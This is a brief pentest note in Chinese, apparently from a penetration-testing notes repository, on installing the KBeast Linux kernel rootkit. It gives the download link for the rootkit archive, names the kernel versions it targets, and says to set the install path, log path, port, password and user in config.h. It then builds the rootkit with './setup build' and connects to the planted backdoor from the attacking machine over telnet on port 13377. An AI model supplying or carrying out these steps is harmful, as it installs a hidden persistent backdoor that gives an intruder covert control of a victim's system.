	http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
	version - 0 : 2.6.18 (RHEL/CentOS 5.x)
          	1 : 2.6.32 (Ubuntu 10.x) [default version]
	修改配置config.h
	安装路径、日志路径、端口、连接密码、连接用户
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/574.png)

	./setup build
	攻击机连接
	>telnet 192.168.1.1 13377